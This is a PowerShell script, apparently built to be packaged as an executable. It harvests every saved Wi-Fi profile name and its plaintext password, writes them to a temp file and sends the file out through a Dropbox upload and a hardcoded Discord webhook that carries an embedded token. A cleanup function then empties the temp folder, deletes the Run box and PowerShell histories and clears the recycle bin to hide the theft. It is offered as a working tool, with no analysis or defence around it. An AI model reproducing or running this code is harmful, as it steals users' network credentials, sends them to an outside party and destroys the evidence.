##[Ps1 To Exe]
##
##Kd3HDZOFADWE8uO1
##Nc3NCtDXTlaDjofG5iZk2WHbcVxrRuS4kpODhK6Sw87jrCvVRpsQWmhdwmStURvwCaNfU/oBu8NcB014fKJdsOaHS7T+C6sJnYM=
##Kd3HFJGZHWLWoLaVvnQnhQ==
##LM/RF4eFHHGZ7/K1
##K8rLFtDXTiW5
##OsHQCZGeTiiZ4dI=
##OcrLFtDXTiW5
##LM/BD5WYTiiZ4tI=
##McvWDJ+OTiiZ4tI=
##OMvOC56PFnzN8u+Vs1Q=
##M9jHFoeYB2Hc8u+Vs1Q=
##PdrWFpmIG2HcofKIo2QX
##OMfRFJyLFzWE8uK1
##KsfMAp/KUzWJ0g==
##OsfOAYaPHGbQvbyVvnQX
##LNzNAIWJGmPcoKHc7Do3uAuO
##LNzNAIWJGnvYv7eVvnQX
##M9zLA5mED3nfu77Q7TV64AuzAgg=
##NcDWAYKED3nfu77Q7TV64AuzAgg=
##OMvRB4KDHmHQvbyVvnQX
##P8HPFJGEFzWE8tI=
##KNzDAJWHD2fS8u+Vgw==
##P8HSHYKDCX3N8u+Vgw==
##LNzLEpGeC3fMu77Ro2k3hQ==
##L97HB5mLAnfMu77Ro2k3hQ==
##P8HPCZWEGmaZ7/K1
##L8/UAdDXTlODjqXc5T039l/rQ2QufIueobPH
##Kc/BRM3KXxU=
##
##
##fd6a9f26a06ea3bc99616d4851b372ba
############################################################################################################################################################

$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String


$wifiProfiles > $env:TEMP/--wifi-pass.txt

############################################################################################################################################################

# Upload output file to Dropbox

function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}

############################################################################################################################################################

# function Upload-Discord {

# [CmdletBinding()]
# param (
#     [parameter(Position=0,Mandatory=$False)]
#     [string]$file,
#     [parameter(Position=1,Mandatory=$False)]
#     [string]$text 
# )

# $hookurl = "https://discord.com/api/webhooks/1115463743707545630/WkkDi7gAXmr1qoufS_9Hr4qz509C8eKFlPkvyA4m4u_g7zxHv91Dls_BbbGeTVYhbGAC"

# $Body = @{
#   'username' = $env:username
#   'content' = $text
# }

# if (-not ([string]::IsNullOrEmpty($text))){
# Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

# if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
# }

function Upload-Discord {
  [CmdletBinding()]
  param (
      [parameter(Position=0,Mandatory=$False)]
      [string]$file,
      [parameter(Position=1,Mandatory=$False)]
      [string]$text 
  )
  
  $hookurl = "https://discord.com/api/webhooks/1115463743707545630/WkkDi7gAXmr1qoufS_9Hr4qz509C8eKFlPkvyA4m4u_g7zxHv91Dls_BbbGeTVYhbGAC"
  
  $Body = @{
      'username' = $env:username
      'content' = $text
      'embeds' = @(
          @{
              'color' = 16711680   # Set the color here (e.g., 16711680 for red)
              'description' = $text
          }
      )
  }
  
  if (-not ([string]::IsNullOrEmpty($text))){
      Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
  }
  
  if (-not ([string]::IsNullOrEmpty($file))){
      curl.exe -F "file1=@$file" $hookurl
  }
}


if (-not ([string]::IsNullOrEmpty("https://discord.com/api/webhooks/1115463743707545630/WkkDi7gAXmr1qoufS_9Hr4qz509C8eKFlPkvyA4m4u_g7zxHv91Dls_BbbGeTVYhbGAC"))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}






 





############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}



RI $env:TEMP/--wifi-pass.txt



